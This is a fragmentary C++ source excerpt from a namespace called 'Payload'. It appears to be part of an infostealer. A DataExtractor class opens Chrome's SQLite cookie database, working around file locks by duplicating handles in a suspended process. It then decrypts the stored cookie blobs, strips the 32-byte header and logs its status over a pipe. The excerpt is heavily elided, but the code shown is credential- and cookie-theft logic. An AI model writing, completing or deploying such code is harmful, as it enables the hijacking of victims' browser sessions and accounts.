...
namespace Payload {
    ...
    // Original simple open (no URI, no nolock) – works because process is suspended and files aren’t locked
    ...
    sqlite3* DataExtractor::OpenDatabaseWithHandleDuplication(const std::filesystem::path& dbPath) {
        ...
        // If locked, duplicate the handle (preserves original logic)
        try {
            ...
            m_pipe.LogDebug("Handle duplication failed: " + std::string(e.what()));
            return nullptr;
        }
    }
        ...
        while (sqlite3_step(stmt) == SQLITE_ROW) {
            ...
            if (blob && blobLen > 0) {
                ...
                if (decrypted && !decrypted->empty()) {
                    // Chrome cookies have a 32-byte header after decryption
                    std::string value;
                    if (decrypted->size() > 32) {
                        value = std::string((char*)decrypted->data() + 32, decrypted->size() - 32);
                    }
                    else {
                        value = std::string((char*)decrypted->data(), decrypted->size());
                    }
